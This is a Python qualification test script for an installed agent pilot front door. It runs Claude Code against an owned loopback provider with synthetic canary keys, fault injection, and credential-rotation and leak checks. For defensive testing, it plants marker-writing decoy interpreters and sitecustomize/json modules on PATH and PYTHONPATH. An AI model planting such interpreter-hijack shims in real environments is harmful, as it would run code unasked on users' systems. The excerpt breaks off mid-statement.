#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""Qualification of the installed guided-pilot front door.

Native Ubuntu 24.04 x86_64, non-root, exact clean source. The component is
built from this checkout, installed into a clean private Agent home outside
the checkout and then used only through `agentfw pilot` from a working
directory outside the checkout, with a sanitized environment that carries a
hostile PATH interpreter, PYTHONPATH and PYTHONSTARTUP. Pinned original
filesystem and Git servers, genuine Claude Code and the existing owned
scripted loopback provider; no model account, paid call or private data.

Cases: component install and verify; zero-effect preview; prepare and reuse;
an existing selection prepared by the checkout front door; status before,
during and after a run; one useful original read and Git history call with
witnessed refused write, reset and send; Ctrl-C cancellation with owned
cleanup; tampered helper and interpreter
refusals; interrupted update recovery; failed update keeping the previous
component; update and rollback; removal refusing a redirected parent; owned
removal. Project, repository and user
configuration witnesses must stay unchanged. Raw traces stay private.
"""
from __future__ import annotations

import argparse
import ast
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import shutil
import signal
import stat
import subprocess
import sys
import re
import tempfile

ROOT = Path(__file__).resolve().parents[1]
FORMAT = "sw-installed-front-door-qualification/1"


def load(name, filename):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / filename)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


QUAL = load("installed_front_door_first_use", "qualify-pilot-front-door.py")
PROVIDER = load("installed_provider_carrier", "pilot_provider.py")
LAUNCH = load("installed_provider_trace", "qualify-pilot-launcher.py")
PROVIDER_CA_QUALIFICATION = load("installed_provider_ca_qualification", "pilot_provider_ca_qualification.py")
BASE = QUAL.BASE
require = BASE.require
INPUT_NAMES = tuple(name for name in QUAL.INPUT_NAMES if name != "agent_output")
HOSTILE = """from pathlib import Path
Path({marker!r}).write_text("ambient helper executed")
"""
DIAGNOSTIC_LIMIT = 4096
COMPONENT_STDOUT_LIMIT = 64 * 1024


def diagnostic_text(raw, limit=DIAGNOSTIC_LIMIT):
    """Bound UTF-8 bytes even when replacement characters expand bad input."""
    encoded = raw[:limit].decode("utf-8", "replace").encode("utf-8")
    return encoded[:limit].decode("utf-8", "ignore"), len(raw) > limit or len(encoded) > limit


def component_output(raw):
    """Only a bounded JSON object can satisfy a component result check."""
    if len(raw) > COMPONENT_STDOUT_LIMIT:
        return {}, "oversized"
    if not raw.strip():
        return {}, "empty"
    try:
        value = json.loads(raw)
        json.dumps(value, allow_nan=False)
    except (ValueError, RecursionError):
        return {}, "invalid_json"
    if not isinstance(value, dict):
        return {}, "non_object"
    return value, "object"


def interpreter_diagnostic(path):
    """Private failure evidence; never execute an unprotected interpreter."""
    result = {"selected": str(path), "version_probe": {"status": "not_run"}}
    try:
        canonical = path.resolve(strict=True)
        info = canonical.stat()
        result.update(canonical=str(canonical), mode=oct(stat.S_IMODE(info.st_mode)), uid=info.st_uid,
                      regular=stat.S_ISREG(info.st_mode))
        if (not path.is_absolute() or not stat.S_ISREG(info.st_mode) or info.st_mode & 0o022
                or info.st_uid not in (0, os.geteuid())):
            result["version_probe"]["reason"] = "unprotected_interpreter"
            return result
        probe = subprocess.run([str(canonical), "-I", "-S", "-c",
                                "import sys;print(sys.implementation.name, *sys.version_info[:3])"],
                               cwd="/", env={}, stdin=subprocess.DEVNULL, capture_output=True, timeout=5)
        out, out_cut = diagnostic_text(probe.stdout, 512)
        err, err_cut = diagnostic_text(probe.stderr, 512)
        result["version_probe"] = {"status": "completed", "exit": probe.returncode,
                                   "stdout": out, "stdout_truncated": out_cut,
                                   "stderr": err, "stderr_truncated": err_cut}
    except subprocess.TimeoutExpired:
        result["version_probe"] = {"status": "timeout"}
    except (OSError, RuntimeError) as error:
        result["version_probe"] = {"status": "unavailable", "error_type": type(error).__name__}
    return result


class InstalledDoor(QUAL.FrontDoor):
    """The same guided commands, started only as `agentfw pilot`."""

    def __init__(self, args, env, cwd, home):
        super().__init__(args, env, cwd)
        self.home = home

    def words(self, command, *extra, **options):
        words = super().words(command, *extra, **options)
        require(words[2].endswith("scripts/pilot.py"), "unexpected_front_door_words")
        return [str(self.args.agentfw), "pilot", "--home", str(self.home), *words[3:]]


def component(args, home, archive, digest, *extra, env, trace=None, diagnostic=None):
    words = [str(args.agentfw), "pilot-component", "--home", str(home), *extra]
    if archive is not None:
        words += [str(archive), "--sha256", digest, "--python", str(args.component_python)]
    if trace is not None:
        words = [str(args.strace), "-f", "-qq", "-o", "/dev/null", "-e", "trace=rename",
                 "-e", f"inject=rename:signal=SIGKILL:when={trace}", *words]
    result = subprocess.run(words, cwd=args.work, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=300)
    value, kind = component_output(result.stdout)
    if diagnostic is not None:
        stderr, cut = diagnostic_text(result.stderr)
        diagnostic.update(exit=result.returncode, stdout_kind=kind,
                          stdout=value if kind == "object" and len(result.stdout) <= DIAGNOSTIC_LIMIT else None,
                          stdout_bytes=len(result.stdout), stdout_omitted=len(result.stdout) > DIAGNOSTIC_LIMIT,
                          stderr=stderr, stderr_truncated=cut)
    return result.returncode, value, result.stderr.decode("utf-8", "replace")


def install_component(args, home, archive, digest, expected, env, report):
    diagnostic = {}
    code, value, _ = component(args, home, archive, digest, "install", env=env, diagnostic=diagnostic)
    if code != 0 or value.get("component") != expected:
        report["component_install_failure"] = dict(
            diagnostic, selected_python=interpreter_diagnostic(args.component_python))
    require(code == 0 and value.get("component") == expected, "component_install_failed")
    return value


def build(source_root, output, env):
    result = subprocess.run([sys.executable, "-B", str(source_root / "scripts/build-pilot-front-door.py"),
                             "--out", str(output)], cwd=source_root, env=env, stdin=subprocess.DEVNULL,
                            capture_output=True, timeout=300)
    require(result.returncode == 0, "component_build_failed:" + result.stderr.decode("utf-8", "replace")[-200:])
    return json.loads(result.stdout.decode().splitlines()[-1])


def update_candidate(args, env):
    """A second component: the same tracked tree committed in a private
    repository, so only the recorded source identity differs."""
    tree = args.output / "update-source"
    tree.mkdir(mode=0o700)
    archive = subprocess.run(["git", "archive", "--format=tar", "HEAD"], cwd=ROOT, env=env, capture_output=True,
                             check=True, timeout=120).stdout
    subprocess.run(["tar", "-x", "-C", str(tree)], input=archive, check=True, timeout=120)
    git = str(args.git)
    for words in (("init", "-q", str(tree)), ("-C", str(tree), "add", "-A"),
                  ("-C", str(tree), "commit", "-qm", "Owned installed front-door update candidate")):
        subprocess.run([git, *words], env=env, check=True, capture_output=True, timeout=120)
    path = args.output / "component-update.tar"
    row = build(tree, path, dict(env, PATH="/usr/bin:/bin"))
    shutil.rmtree(tree)
    return path, row


def refused(door, label, home_env, reason):
    """`agentfw pilot` refuses before any helper or interpreter starts."""
    trace = door.args.output / (label + ".trace.private")
    code, value, stderr = door.call("status", "--state-root", str(door.args.state_root), inputs=False,
                                    trace=trace, timeout=120, env=home_env)
    observed = QUAL.executed(trace, {"python": door.args.component_python, "copy": door.args.python_copy})
    agent_starts = agent_executions(trace, door.args.agentfw)
    trace.unlink()
    require(agent_starts == 1, label + "_started_agent_again")
    require(code == 2 and value.get("status") == "failed" and value.get("executed") is False
            and value.get("reason") == reason and value.get("action"), label + "_not_refused:" + str(value.get("reason")))
    require(not observed["selected_started"] and observed["inet_connects"] == 0, label + "_started_interpreter")
    require("agentfw pilot: " in stderr and "Next:" in stderr, label + "_without_operator_action")
    return {"case": label, "passed": True, "reason": value["reason"], "interpreter_started": 0}


def agent_executions(trace, agentfw):
    rows = trace.read_text(errors="replace").splitlines()
    return sum(1 for row in rows if f'execve("{agentfw}"' in row and row.rstrip().endswith("= 0"))


def sanitized_environment(args, home):
    """Minimal operator environment with hostile ambient Python selections."""
    env = QUAL.qualification_environment(home)
    for key in ("RUSTUP_TOOLCHAIN", "RUSTUP_HOME", "CARGO_HOME"):
        env.pop(key, None)
    hostile = args.output / "hostile"
    (hostile / "bin").mkdir(parents=True, mode=0o700)
    (hostile / "site").mkdir(mode=0o700)
    marker = args.output / "ambient-helper-executed"
    for name in ("python3", "python3.12", "python", "pilot.py"):
        path = hostile / "bin" / name
        path.write_text("#!/bin/sh\necho ambient > " + str(marker) + "\nexit 97\n")
        path.chmod(0o700)
    for name in ("sitecustomize.py", "json.py", "pilot_provider.py", "pilot_source_identity.py", "startup.py"):
        (hostile / "site" / name).write_text(HOSTILE.format(marker=str(marker)))
    env.update(PATH=str(hostile / "bin") + ":/usr/bin:/bin", PYTHONPATH=str(hostile / "site"),
               PYTHONSTARTUP=str(hostile / "site/startup.py"))
    # A working directory with a project-provided helper of the same name.
    work = args.output / "work"
    (work / "scripts").mkdir(parents=True, mode=0o700)
    for name in ("pilot.py", "pilot_source_identity.py", "prepare-installed-pilot.py"):
        (work / "scripts" / name).write_text(HOSTILE.format(marker=str(marker)))
    (work / "source-identity.json").write_text("{}\n")
    return env, marker, work


def provider_call(args, home, env, canary, words, secret_fd=None, *, trace=None):
    command = [str(args.agentfw), "pilot", "--home", str(home), "provider", *words]
    if trace is not None:
        command = [str(args.strace), "-f", "-qq", "-v", "-s", str(QUAL.PROVIDER_TRACE_STRING_BYTES),
                   "-e", "trace=execve,execveat", "-o", str(trace), *command]
    result = subprocess.run(command, cwd=args.work, env=env, stdin=subprocess.DEVNULL,
                            capture_output=True, pass_fds=(secret_fd,) if secret_fd is not None else (), timeout=30)
    markers = canary if isinstance(canary, (tuple, list)) else (canary,)
    require(all(marker.encode() not in result.stdout + result.stderr for marker in markers),
            "provider_canary_in_operator_output")
    require(len(result.stdout) <= 65536 and len(result.stderr) <= 65536, "provider_operator_output_limit")
    try:
        value = json.loads(result.stdout)
    except ValueError:
        value = {}
    return result.returncode, value


def provider_exec_witness(trace, claude, canary, url, ca_source=None):
    """Every successful exec is checked; only the one selected host receives the canary."""
    raw = trace.read_bytes()
    require(len(raw) <= 32 * 1024 * 1024, "provider_trace_limit")
    try:
        text = raw.decode("utf-8", "strict")
    except UnicodeError:
        raise ValueError("provider_trace_encoding") from None
    # The shared normalizer pairs unfinished and resumed rows by PID. For this
    # credential witness, also require the resumed syscall name to match.
    unfinished_exec = {}
    for line in text.splitlines():
        started = re.match(r"^\s*(\d+)\s+(execve|execveat)\(.*\s+<unfinished \.\.\.>$", line)
        resumed = re.match(r"^\s*(\d+)\s+<\.\.\. (\w+) resumed>", line)
        if started:
            unfinished_exec[started[1]] = started[2]
        elif resumed and resumed[1] in unfinished_exec:
            require(resumed[2] == unfinished_exec.pop(resumed[1]),
                    "provider_trace_resume_mismatch")
    rows, pending = LAUNCH.normalized_syscalls(text)
    require(not pending, "provider_trace_incomplete")
    host = others = 0
    for row in rows:
        if not re.match(r"^\d+\s+execve(?:at)?\b", row):
            continue
        match = re.fullmatch(r"\d+\s+(execve|execveat)\((.*)\)\s+=\s+"
                             r"(0|-1 [A-Z][A-Z0-9_]*(?: \([^\n)]*\))?)\s*", row)
        require(match is not None, "provider_exec_parse_incomplete")
        if match[3].startswith("-1 "):
            continue  # The kernel did not create a process.
        try:
            parsed = ast.parse("(" + match[2] + ")", mode="eval").body
            require(isinstance(parsed, ast.Tuple) and len(parsed.elts) ==
                    (3 if match[1] == "execve" else 5), "provider_exec_parse_incomplete")
            if match[1] == "execve":
                image, argv, environ = (ast.literal_eval(item) for item in parsed.elts)
            else:
                directory, image, argv, environ, flags = parsed.elts
                if isinstance(directory, ast.Name):
                    require(directory.id == "AT_FDCWD", "provider_exec_parse_incomplete")
                else:
                    descriptor = ast.literal_eval(directory)
                    require(type(descriptor) is int and descriptor >= -100,
                            "provider_exec_parse_incomplete")
                def valid_flags(node):
                    return (isinstance(node, ast.Constant) and node.value == 0
                            or isinstance(node, ast.Name) and node.id in
                            {"AT_EMPTY_PATH", "AT_SYMLINK_NOFOLLOW"}
                            or isinstance(node, ast.BinOp) and isinstance(node.op, ast.BitOr)
                            and valid_flags(node.left) and valid_flags(node.right))
                require(valid_flags(flags), "provider_exec_parse_incomplete")
                image, argv, environ = (ast.literal_eval(item)
                                        for item in (image, argv, environ))
        except (ValueError, SyntaxError, TypeError, RecursionError):
            raise ValueError("provider_exec_parse_incomplete") from None
        require(isinstance(image, str) and isinstance(argv, list) and isinstance(environ, list)
                and all(isinstance(item, str) for item in argv + environ), "provider_exec_parse_incomplete")
        require(not any(canary in word for word in argv), "provider_canary_in_argv")
        if match[1] == "execveat":
            # An absolute pathname identifies the image independently of
            # dirfd. Empty/relative and proc-fd paths do not: never promote
            # such an execution to the selected host or silently omit it.
            form = ("empty" if not image else "relative" if not image.startswith("/") else
                    "fd_alias" if re.match(r"^/(?:proc/(?:self|thread-self|\d+)/fd|dev/fd)/", image)
                    else None)
            require(form is None, "provider_exec_identity_incomplete:" + str(form))
        values = dict(item.split("=", 1) for item in environ if "=" in item)
        intended = image == str(claude) and argv[1:3] == ["--restricted", "-p"]
        if intended:
            require(sum(item.startswith("ANTHROPIC_API_KEY=") for item in environ) <= 1
                    and sum(item.startswith("ANTHROPIC_BASE_URL=") for item in environ) <= 1,
                    "provider_host_values_ambiguous")
            host += 1
            require(values.get("ANTHROPIC_API_KEY") == canary
                    and values.get("ANTHROPIC_BASE_URL") == url, "provider_host_values_missing")
            if ca_source is not None:
                require(re.fullmatch(r"/proc/self/fd/[0-9]+", values.get("SSL_CERT_FILE", ""))
                        and values["SSL_CERT_FILE"] != ca_source,
                        "provider_host_ca_descriptor_missing")
        else:
            others += 1
            require(not any(canary in word or url in word for word in environ),
                    "provider_value_in_unrelated_child")
            if ca_source is not None:
                require("SSL_CERT_FILE" not in values and ca_source not in environ,
                        "provider_ca_in_unrelated_child")
    require(host == 1 and others >= 4, "provider_process_graph_incomplete")
    witness = {"selected_host_execs": host, "other_execs_checked": others,
               "canary_in_other_children": False, "canary_in_argv": False}
    if ca_source is not None:
        witness["ca_source_in_other_children"] = False
        witness["host_ca_descriptor_bound"] = True
    return witness


def provider_files_witness(args, canary):
    checked = 0
    paths = [args.prefix / "front-door.json", args.prefix / "preparation/current.json",
             *args.prefix.glob("preparation/generations/*/selection.json"),
             *args.state_root.rglob("*")]
    for path in paths:
        if not path.exists() and not path.is_symlink():
            continue
        info = path.lstat()
        require(not stat.S_ISLNK(info.st_mode), "provider_retained_link_unexpected")
        if not stat.S_ISREG(info.st_mode):
            continue
        require(info.st_size <= 16 * 1024 * 1024 and checked < 256,
                "provider_retained_witness_limit")
        require(canary.encode() not in path.read_bytes(), "provider_canary_in_retained_file")
        checked += 1
    return {"files_checked": checked, "canary_in_retained_files": False}


def qualify_provider_profiles(args, door, home, env, report, proposals):
    """Opt-in SOU-172 installed original-host control; no real provider account."""
    canary = "sou172-synthetic-" + os.urandom(16).hex()
    profile_env = {key: value for key, value in env.items() if key not in PROVIDER.KEYS}
    calls = []
    authentication = []
    models = []
    def command(words, secret_fd=None):
        code, value = provider_call(args, home, profile_env, canary, words, secret_fd)
        calls.append({"action": words[0], "exit": code, "status": value.get("status"),
                      "reason": value.get("reason")})
        return code, value
    code, value = command(["preview"])
    require(code == 0 and value.get("profiles") == [] and value.get("selected") is None,
            "provider_initial_preview_not_empty")
    require(not (home / "pilot-providers").exists(), "provider_preview_created_store")
    def setup(model):
        models.append(model)
        original = model.server.RequestHandlerClass
        class Authenticated(original):
            def do_POST(self):
                authentication.append({"key": self.headers.get("x-api-key"),
                                       "authorization": self.headers.get("authorization")})
                return super().do_POST()
        model.server.RequestHandlerClass = Authenticated
        with PROVIDER.carrier({"ANTHROPIC_API_KEY": canary}) as fd:
            code, value = command(["create", "--name", "owned-loopback", "--model", "claude-sonnet-4-20250514",
                                   "--base-url", model.url, "--secret-fd", str(fd), "--apply"], fd)
        require(code == 0 and value.get("status") == "saved", "provider_create_failed")
        code, value = command(["select", "--name", "owned-loopback", "--apply"])
        require(code == 0 and value.get("status") == "selected", "provider_select_failed")
        code, preview = command(["preview"])
        require(code == 0 and preview.get("selected") == "owned-loopback"
                and preview.get("redacted") is True and canary not in json.dumps(preview)
                and not authentication and not model.requests, "provider_preview_not_private_or_effect_free")
        return {"ANTHROPIC_API_KEY": canary, "ANTHROPIC_BASE_URL": model.url}
    trace = args.output / "provider-exec.trace.private"
    try:
        row, results, _ = QUAL.run_case(args, door, report, "provider-profile", proposals,
                                       provider_setup=setup, provider_trace=trace)
        require(row["exit"] == 0 and row["status"] == "completed"
                and results["toolu_front_provider-profile_0"]["is_error"] is False
                and results["toolu_front_provider-profile_1"]["is_error"] is False
                and row["process_cleanup"]["all_stopped"], "provider_useful_original_flow_failed")
        require(authentication and all(item["key"] == canary and item["authorization"] is None
                                       for item in authentication), "provider_authentication_not_observed")
        require(all(canary.encode() not in body for body in models[0].requests),
                "provider_canary_in_request_body")
        witness = provider_exec_witness(trace, args.claude, canary, models[0].url)
    finally:
        trace.unlink(missing_ok=True)
    row["provider_witness"] = witness
    row["provider_requests"] = len(authentication)
    row["retained_witness"] = provider_files_witness(args, canary)
    row["passed"] = True
    def refused_run(label, run_env, reason):
        negative = args.output / (label + ".trace.private")
        try:
            code, value, stderr = door.call("run", "--state-root", str(args.state_root), inputs=False,
                                            trace=negative, env=run_env, timeout=90)
            require(canary not in stderr and canary not in json.dumps(value),
                    "provider_canary_in_refusal")
            lines = negative.read_text(errors="replace").splitlines()
            require(code != 0 and value.get("reason") == reason and value.get("host_started", False) is False,
                    label + "_did_not_refuse")
            require(not any('"pilot-launch"' in line or '"serve"' in line for line in lines),
                    label + "_started_owned_child")
            report["cases"].append({"case": label, "passed": True, "reason": reason,
                                    "owned_daemon_or_host_started": False})
        finally:
            negative.unlink(missing_ok=True)
    refused_run("provider-source-conflict", dict(profile_env, ANTHROPIC_API_KEY="other-synthetic-input"),
                "provider_source_conflict")
    profile = home / "pilot-providers/owned-loopback.json"
    profile.chmod(0o644)
    try:
        refused_run("provider-bad-profile", profile_env, "provider_private_file_required")
    finally:
        profile.chmod(0o600)
    code, value = command(["remove", "--name", "owned-loopback", "--apply"])
    require(code == 0 and value.get("removed") == "owned-loopback", "provider_remove_failed")
    refused_run("provider-removed-selection", profile_env, "provider_profile_missing")
    code, value = command(["select", "--environment", "--apply"])
    require(code == 0 and value.get("selection") == "explicit-environment",
            "provider_environment_selection_failed")
    require(provider_files_witness(args, canary)["canary_in_retained_files"] is False,
            "provider_post_removal_file_witness_failed")
    report["provider_profile_calls"] = calls
    require(canary not in json.dumps(report), "provider_canary_in_public_report")


def provider_index_commit_interrupted(evidence, index_filename):
    target = re.escape(index_filename.encode("ascii"))
    destination = rb'renameat\([^,\n]*,\s*"[^"\n]*",\s*[^,\n]*,\s*"' + target + rb'"'
    return (re.search(destination, evidence) is not None and
            b"killed by SIGKILL" in evidence)


def qualify_provider_rotation(args, door, home, env, report, proposals):
    """SOU-181: real installed-host launches with only owned synthetic providers."""
    old_key, new_key, wrong_key = (
        "sou181-" + label + "-" + os.urandom(16).hex()
        for label in ("old", "new", "wrong"))
    secrets = (old_key, new_key, wrong_key)
    profile_env = {key: value for key, value in env.items() if key not in PROVIDER.KEYS}
    old_model, new_model = BASE.DEMO.ScriptedModel([]), BASE.DEMO.ScriptedModel([])
    old_auth, new_auth = [], []
    versions, calls = {}, []
    name = "owned-loopback"

    def command(words, secret_fd=None, *, trace=None):
        code, value = provider_call(args, home, profile_env, secrets, words, secret_fd, trace=trace)
        calls.append({"action": words[0], "status": value.get("status"),
                      "reason": value.get("reason"), "exit": code})
        return code, value

    def authenticate(model, expected, ledger):
        original = model.server.RequestHandlerClass
        class Guarded(original):
            def do_POST(self):
                key = self.headers.get("x-api-key")
                token = self.headers.get("authorization")
                ledger.append((key, token))
                if key != expected or token is not None:
                    self.send_response(401)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"type":"error","error":{"type":"authentication_error"}}')
                    return
                return super().do_POST()
        model.server.RequestHandlerClass = Guarded

    def trace_clean(path):
        try:
            require(path.is_file(), "provider_helper_trace_missing")
            raw = path.read_bytes()
            require(len(raw) <= 32 * 1024 * 1024 and
                    all(value.encode() not in raw for value in secrets),
                    "provider_helper_credential_in_exec")
        finally:
            path.unlink(missing_ok=True)

    def values():
        # The run_case output gate checks every synthetic credential before a
        # bounded row can enter its public report. It never exports these values.
        return {"old": old_key, "new": new_key, "wrong": wrong_key}

    def healthy(row, results, label):
        require(row["exit"] == 0 and row["status"] == "completed" and
                row["process_cleanup"]["all_stopped"] and
                results[f"toolu_front_{label}_0"]["is_error"] is False,
                "provider_rotation_host_flow_failed")
        row["passed"] = True

    try:
        authenticate(old_model, old_key, old_auth)
        authenticate(new_model, new_key, new_auth)

        def old_setup(model):
            require(model is old_model, "provider_old_model_changed")
            with PROVIDER.carrier({"ANTHROPIC_API_KEY": old_key}) as fd:
                code, value = command(["create", "--name", name, "--model", "claude-sonnet-4-20250514",
                                       "--base-url", old_model.url, "--secret-fd", str(fd), "--apply"], fd)
            require(code == 0 and value.get("status") == "saved", "provider_old_create_failed")
            code, value = command(["select", "--name", name, "--apply"])
            require(code == 0 and value.get("status") == "selected", "provider_old_select_failed")
            code, preview = command(["preview", "--name", name])
            require(code == 0 and preview.get("selected") == name and
                    preview.get("selected_version") in (None, "legacy") and
                    not old_auth and not new_auth and not old_model.requests and not new_model.requests,
                    "provider_rotation_preview_not_inert")
            next_step = model.next

            def rotate_during_old_run(body):
                content = next_step(body)
                names = {item.get("name") for item in body.get("tools", [])}
                if not versions and {"mcp__filesystem__read_text_file", "mcp__git__git_show"} <= names:
                    require(old_auth and not new_auth, "provider_old_auth_not_observed")
                    with PROVIDER.carrier({"ANTHROPIC_API_KEY": new_key}) as fd:
                        trace = args.output / "provider-update-exec.trace.private"
                        try:
                            code, value = command(["update", "--name", name,
                                                   "--expected-version", "legacy",
                                                   "--base-url", new_model.url,
                                                   "--secret-fd", str(fd), "--apply"], fd,
                                                  trace=trace)
                        finally:
                            trace_clean(trace)
                    require(code == 0 and value.get("status") == "updated" and
                            re.fullmatch(r"[0-9a-f]{32}", value.get("version", "")) and
                            re.fullmatch(r"[0-9a-f]{32}", value.get("previous_version", "")),
                            "provider_rotation_update_failed")
                    versions.update(old=value["previous_version"], new=value["version"],
                                    old_requests_at_update=len(old_auth))
                return content
            model.next = rotate_during_old_run
            return values()

        old_trace = args.output / "provider-old-run.trace.private"
        try:
            old_row, old_results, _ = QUAL.run_case(args, door, report, "provider-old-run", proposals[:1],
                                                    provider_setup=old_setup, provider_trace=old_trace,
                                                    model=old_model, close_model=False)
            healthy(old_row, old_results, "provider-old-run")
            require(versions and len(old_auth) > versions["old_requests_at_update"] and
                    all(key == old_key and token is None for key, token in old_auth) and not new_auth,
                    "provider_old_run_not_pinned")
            old_row["provider_witness"] = provider_exec_witness(old_trace, args.claude, old_key, old_model.url)
            require(new_key.encode() not in old_trace.read_bytes() and
                    new_model.url.encode() not in old_trace.read_bytes(),
                    "provider_new_value_in_old_host")
            old_row["post_update_requests"] = len(old_auth) - versions["old_requests_at_update"]
        finally:
            old_trace.unlink(missing_ok=True)

        def selected_setup(expected_version):
            def setup(model):
                require(model is new_model, "provider_new_model_changed")
                code, preview = command(["preview", "--name", name])
                require(code == 0 and preview.get("selected_version") == expected_version,
                        "provider_new_selection_changed")
                return values()
            return setup

        new_trace = args.output / "provider-new-run.trace.private"
        try:
            new_row, new_results, _ = QUAL.run_case(args, door, report, "provider-new-run", proposals[:1],
                                                    provider_setup=selected_setup(versions["new"]),
                                                    provider_trace=new_trace, model=new_model, close_model=False)
            healthy(new_row, new_results, "provider-new-run")
            require(new_auth and all(key == new_key and token is None for key, token in new_auth),
                    "provider_new_run_wrong_credential")
            new_row["provider_witness"] = provider_exec_witness(new_trace, args.claude, new_key, new_model.url)
            successful_new_requests = len(new_auth)
        finally:
            new_trace.unlink(missing_ok=True)

        # Validation is local: malformed credentials and an invalid endpoint
        # refuse before publication, without contacting either owned provider.
        before = (len(old_auth), len(new_auth))
        with tempfile.TemporaryFile(mode="w+b") as invalid:
            os.fchmod(invalid.fileno(), 0o600)
            invalid.write(b"{}")
            invalid.seek(0)
            code, value = command(["update", "--name", name, "--expected-version", versions["new"],
                                   "--secret-fd", str(invalid.fileno()), "--apply"], invalid.fileno())
        require(code != 0 and value.get("reason") == "provider_secret_input_invalid",
                "provider_malformed_secret_accepted")
        code, value = command(["update", "--name", name, "--expected-version", versions["new"],
                               "--base-url", new_model.url + "?forbidden=1", "--apply"])
        require(code != 0 and value.get("reason") == "provider_transport_invalid",
                "provider_bad_endpoint_accepted")
        code, preview = command(["preview", "--name", name])
        require(code == 0 and preview.get("selected_version") == versions["new"] and
                before == (len(old_auth), len(new_auth)), "provider_invalid_update_changed_selection")
        report["cases"].append({"case": "provider-invalid-update", "passed": True,
                                "network_requests": 0, "selection_unchanged": True})

        with PROVIDER.carrier({"ANTHROPIC_API_KEY": wrong_key}) as fd:
            code, value = command(["update", "--name", name, "--expected-version", versions["new"],
                                   "--secret-fd", str(fd), "--apply"], fd)
        require(code == 0 and value.get("status") == "updated" and
                re.fullmatch(r"[0-9a-f]{32}", value.get("version", "")),
                "provider_wrong_credential_setup_failed")
        versions["wrong"] = value["version"]
        wrong_before = len(new_auth)
        wrong_trace = args.output / "provider-wrong-run.trace.private"
        try:
            wrong_row, wrong_results, _ = QUAL.run_case(
                args, door, report, "provider-wrong-run", proposals[:1],
                provider_setup=selected_setup(versions["wrong"]), provider_trace=wrong_trace,
                model=new_model, close_model=False)
            require(wrong_row["exit"] != 0 and wrong_row["status"] == "failed" and
                    not any(key.startswith("toolu_front_provider-wrong-run_") for key in wrong_results) and
                    wrong_row["process_cleanup"]["all_stopped"] and
                    len(new_auth) > wrong_before and
                    all(key == wrong_key and token is None for key, token in new_auth[wrong_before:]) and
                    all(key == old_key for key, _ in old_auth),
                    "provider_wrong_credential_not_refused")
            wrong_row["provider_witness"] = provider_exec_witness(
                wrong_trace, args.claude, wrong_key, new_model.url)
            wrong_row["passed"] = True
            wrong_row["owned_401_observed"] = True
        finally:
            wrong_trace.unlink(missing_ok=True)

        code, value = command(["restore", "--name", name, "--version", versions["old"],
                               "--expected-version", versions["wrong"], "--apply"])
        require(code == 0 and value.get("status") == "restored" and
                value.get("version") == versions["old"], "provider_explicit_restore_failed")

        # A test-only syscall fault kills the installed helper at the atomic
        # index replacement. The orphaned immutable version cannot select.
        store_root = home / "pilot-providers"
        before_versions = {path.name for path in store_root.iterdir()
                           if re.fullmatch(r"v-[0-9a-f]{32}", path.name)}
        fault_trace = args.output / "provider-interrupted-update.trace.private"
        with PROVIDER.carrier({"ANTHROPIC_API_KEY": new_key}) as fd:
            words = [str(args.strace), "-f", "-qq", "-o", str(fault_trace),
                     "-e", "trace=renameat", "-e", "inject=renameat:signal=SIGKILL:when=2",
                     str(args.agentfw), "pilot", "--home", str(home), "provider", "update",
                     "--name", name, "--expected-version", versions["old"],
                     "--base-url", new_model.url, "--secret-fd", str(fd), "--apply"]
            try:
                injected = subprocess.run(words, cwd=args.work, env=profile_env, stdin=subprocess.DEVNULL,
                                          capture_output=True, pass_fds=(fd,), timeout=45)
            finally:
                try:
                    require(fault_trace.is_file(), "provider_interruption_trace_missing")
                    evidence = fault_trace.read_bytes()
                    require(len(evidence) <= 65536 and
                            all(key.encode() not in evidence for key in secrets) and
                            provider_index_commit_interrupted(
                                evidence, load("rotation_profile_store", "pilot_provider_profiles.py").INDEX_FILE),
                            "provider_interruption_not_at_index_commit")
                finally:
                    fault_trace.unlink(missing_ok=True)
        require(injected.returncode != 0 and len(injected.stdout) <= 65536 and
                len(injected.stderr) <= 65536 and
                all(key.encode() not in injected.stdout + injected.stderr for key in secrets),
                "provider_interruption_not_bounded")
        code, preview = command(["preview", "--name", name])
        require(code == 0 and preview.get("selected_version") == versions["old"],
                "provider_interruption_changed_selection")
        orphans = {path.name for path in store_root.iterdir()
                   if re.fullmatch(r"v-[0-9a-f]{32}", path.name)} - before_versions
        require(len(orphans) == 1 and all(
            not path.is_symlink() and path.stat().st_mode & 0o777 == 0o400 and
            path.stat().st_uid == os.getuid() and path.stat().st_nlink == 1 and
            path.stat().st_size <= PROVIDER.MAX_BYTES
            for path in (store_root / entry for entry in orphans)) and
            all(entry[2:] not in row.get("retained_versions", [])
                for entry in orphans for row in preview.get("profiles", [])),
            "provider_interruption_orphan_not_frozen")
        report["cases"].append({"case": "provider-interrupted-update", "passed": True,
                                "selection_unchanged": True, "old_version_usable": True,
                                "fault": "simulated-renameat-sigkill"})

        restored_trace = args.output / "provider-restored-run.trace.private"
        old_before = len(old_auth)
        try:
            restored_row, restored_results, _ = QUAL.run_case(
                args, door, report, "provider-restored-run", proposals[:1],
                provider_setup=lambda model: values(), provider_trace=restored_trace,
                model=old_model, close_model=False)
            healthy(restored_row, restored_results, "provider-restored-run")
            require(len(old_auth) > old_before and
                    all(key == old_key and token is None for key, token in old_auth[old_before:]),
                    "provider_restored_host_wrong_credential")
            restored_row["provider_witness"] = provider_exec_witness(
                restored_trace, args.claude, old_key, old_model.url)
        finally:
            restored_trace.unlink(missing_ok=True)

        # Two installed operator processes race from the same selected
        # version. The store lock permits exactly one successful commit.
        command_words = [str(args.agentfw), "pilot", "--home", str(home), "provider", "update",
                         "--name", name, "--expected-version", versions["old"],
                         "--base-url", new_model.url, "--apply"]
        contenders = []
        try:
            contenders = [subprocess.Popen(command_words, cwd=args.work, env=profile_env,
                                           stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, start_new_session=True) for _ in range(2)]
            outcomes = [process.communicate(timeout=45) for process in contenders]
        finally:
            for process in contenders:
                if process.poll() is None:
                    try:
                        os.killpg(process.pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                process.communicate(timeout=5)
            require(all(process.poll() is not None for process in contenders),
                    "provider_concurrent_process_remained")
        require(all(len(out) <= 65536 and len(err) <= 65536 and
                    all(key.encode() not in out + err for key in secrets)
